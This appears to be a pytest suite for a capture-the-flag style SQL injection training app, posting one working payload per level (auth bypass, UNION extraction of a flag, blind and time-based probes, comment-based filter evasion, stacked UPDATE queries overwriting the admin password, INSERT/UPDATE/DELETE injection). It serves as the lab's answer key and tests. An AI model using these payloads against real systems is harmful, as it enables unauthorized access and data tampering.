import time


def _text(response):
    return response.data.decode("utf-8", errors="ignore")


def test_level1_login_bypass(sqli_client):
    resp = sqli_client.post(
        "/level1",
        data={"username": "admin' --", "password": "x"},
        follow_redirects=True,
    )
    assert "CONGRATULATIONS" in _text(resp) or "ACCESS GRANTED" in _text(resp)


def test_level2_integer_bypass(sqli_client):
    resp = sqli_client.get("/level2", query_string={"id": "1 OR 1=1"})
    assert "CONGRATULATIONS" in _text(resp)


def test_level3_union_visible(sqli_client):
    payload = "' UNION SELECT id, flag, 1 FROM secrets--"
    resp = sqli_client.get("/level3", query_string={"search": payload})
    assert "FLAG{SQLI_MASTER_CLASS}" in _text(resp)


def test_level4_error_based(sqli_client):
    resp = sqli_client.get("/level4", query_string={"uuid": "1'"})
    assert "CONGRATULATIONS" in _text(resp)


def test_level5_boolean_blind(sqli_client):
    resp = sqli_client.get("/level5", query_string={"u": "admin' AND 1=1--"})
    assert "CONGRATULATIONS" in _text(resp)


def test_level6_time_based(sqli_client):
    start = time.time()
    resp = sqli_client.get("/level6", query_string={"q": "' OR sleep(3)--"})
    elapsed = time.time() - start
    assert elapsed >= 2
    assert "CONGRATULATIONS" in _text(resp)


def test_level7_filter_bypass_space(sqli_client):
    payload = "1/**/UNION/**/SELECT/**/flag,1,1/**/FROM/**/secrets"
    resp = sqli_client.get("/level7", query_string={"id": payload})
    assert "CONGRATULATIONS" in _text(resp)


def test_level8_second_order(sqli_client):
    resp = sqli_client.post("/level8", data={"username": "admin' --"}, follow_redirects=False)
    assert resp.status_code in (302, 303)
    resp = sqli_client.get("/level8", query_string={"step": "view", "user": "admin' --"})
    assert "CONGRATULATIONS" in _text(resp)


def test_level9_waf_bypass(sqli_client):
    payload = "' UNION/**/SELECT id, flag, 1 FROM secrets--"
    resp = sqli_client.get("/level9", query_string={"q": payload})
    assert "CONGRATULATIONS" in _text(resp)


def test_level10_stacked_queries(sqli_client):
    payload = "1; UPDATE users SET password='pwned' WHERE username='admin';--"
    resp = sqli_client.post("/level10", data={"id": payload})
    assert "CONGRATULATIONS" in _text(resp) or "SYSTEM MODIFIED" in _text(resp)


def test_level11_column_picker(sqli_client):
    resp = sqli_client.get("/level11", query_string={"cols": "name, (SELECT flag FROM secrets)"})
    assert "CONGRATULATIONS" in _text(resp) or "FLAG{SQLI_MASTER_CLASS}" in _text(resp)


def test_level12_rank_expression(sqli_client):
    resp = sqli_client.get("/level12", query_string={"rank": "(SELECT flag FROM secrets)"})
    assert "CONGRATULATIONS" in _text(resp) or "FLAG{SQLI_MASTER_CLASS}" in _text(resp)


def test_level13_in_clause(sqli_client):
    payload = "1) UNION SELECT id, flag, 1 FROM secrets--"
    resp = sqli_client.get("/level13", query_string={"ids": payload})
    assert "CONGRATULATIONS" in _text(resp) or "FLAG{SQLI_MASTER_CLASS}" in _text(resp)


def test_level14_escape_clause(sqli_client):
    payload = "x' OR 1=1 UNION SELECT flag, flag FROM secrets--"
    resp = sqli_client.get("/level14", query_string={"esc": payload, "q": "Power"})
    assert "CONGRATULATIONS" in _text(resp) or "FLAG{SQLI_MASTER_CLASS}" in _text(resp)


def test_level15_update_injection(sqli_client):
    payload = "ok', role='admin"
    resp = sqli_client.post("/level15", data={"username": "user", "status": payload})
    assert "CONGRATULATIONS" in _text(resp)


def test_level16_insert_injection(sqli_client):
    payload = "hacker', 'pw', 'admin', 'active')--"
    resp = sqli_client.post("/level16", data={"username": payload})
    assert "CONGRATULATIONS" in _text(resp)


def test_level17_delete_injection(sqli_client):
    resp = sqli_client.post("/level17", data={"log_id": "1 OR 1=1"})
    assert "CONGRATULATIONS" in _text(resp)


def test_level18_nested_query(sqli_client):
    payload = "' UNION SELECT flag FROM secrets WHERE '1'='1"
    resp = sqli_client.get("/level18", query_string={"ref": payload})
    assert "CONGRATULATIONS" in _text(resp) or "FLAG{SQLI_MASTER_CLASS}" in _text(resp)


def test_level19_base64_bypass(sqli_client):
    payload = "JScgVU5JT04gU0VMRUNUIGlkLCBmbGFnLCAxIEZST00gc2VjcmV0cy0t"
    resp = sqli_client.get("/level19", query_string={"payload": payload})
    assert "CONGRATULATIONS" in _text(resp) or "FLAG{SQLI_MASTER_CLASS}" in _text(resp)


def test_level20_executescript(sqli_client):
    payload = "1=1; UPDATE users SET password='pwned_report' WHERE username='admin';--"
    resp = sqli_client.post("/level20", data={"filter": payload})
    assert "CONGRATULATIONS" in _text(resp)
